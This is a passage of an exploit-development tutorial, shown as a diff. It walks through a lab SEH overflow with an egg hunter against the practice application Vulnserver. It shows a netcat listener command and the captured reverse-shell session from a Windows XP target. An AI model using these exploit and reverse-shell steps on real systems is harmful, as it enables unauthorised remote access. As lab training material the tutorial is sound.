@@ -291,4 +291,23 @@ s.close()
 ```
 Remember when we spoke about egg hunters earlier? Two things were mentioned. 1- The egg hunter looks for two occurences of it's tag in order to execute. This is why we have `w00tw00t` in our second stage shellcode, even though our tag generated on the egg hunter was just `w00t`. We also said that we append our tag onto the front of our shellcode, which is what is going on here. Everything else stays the same- and we are ready to fire off our exploit! We will still use Immunity until we can guarentee 100 percent that our exploit works.
 
-We restart the application in Immunity. We drop kick our exploit like freaking Tim Howard at Vulnserver. The application crashes. Nothing new here- we just open the SEH chain in Immunity. We set a breakpoint on SEH. We then pass the exception onto the application with a `Shift + F9` command. We step through our `pop eax, pop eax, ret` instruction to reach our short jump backwards. We step through that instruction and again land on our egg hunter.
+Before we do anything this time, on our attacking machine- we need to start a `nc` listener to catch our shell when it comes in. We start the listener:
+```console
+root@kali:~/Desktop# nc -nlvp 443
+listening on [any] 443 ...
+```
+We close out of the debugger, and we drop kick our exploit like freaking Tim Howard at the Vulnserver. That egg hunter works hard for us, and BOOM! We are in there like swimwear!!!!! We have obtained a shell:
+
+```console
+root@kali:~/Desktop# nc -nlvp 443
+listening on [any] 443 ...
+connect to [172.16.55.69] from (UNKNOWN) [172.16.55.134] 1239
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Administrator\Desktop\vulnserver-master\vulnserver-master>
+```
+
+Mouth Of The River
+---
+There is an ocean of resources out there about exploit development. This was just a pretty straightforward SEH/egg hunter combination. It is a step above your simple vanilla stack based buffer overflow. There are plenty of blogs on all of those, but the more low level you go- the less there is. I will probably be documeting more of these kinds of things as I go forward. I just want to share information with others in a way that I think is easy to understand. I remember the exact chronological order I had to go to in order to understand these types of things. I hope by sharing what I have learned in my own words, I can relay those phrases or analogies that made me say "AHA!" with all of you! Peace, love, and positivity! Have a great day :-) 
